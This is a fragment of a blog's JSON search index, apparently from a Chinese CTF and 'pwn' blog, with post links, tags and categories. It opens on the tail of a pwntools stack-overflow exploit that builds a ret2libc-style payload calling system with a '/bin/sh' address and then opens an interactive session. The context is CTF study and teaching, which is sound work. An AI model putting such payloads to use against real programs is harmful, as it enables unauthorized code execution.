(0xC8+4) + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendlineafter('Welcome!\\n',payload)p.interactive()","link":"/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"}],"categories":[{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"堆","slug":"堆","link":"/categories/%E5%A0%86/"},{"name":"pwnable","slug":"pwnable","link":"/categories/pwnable/"}]}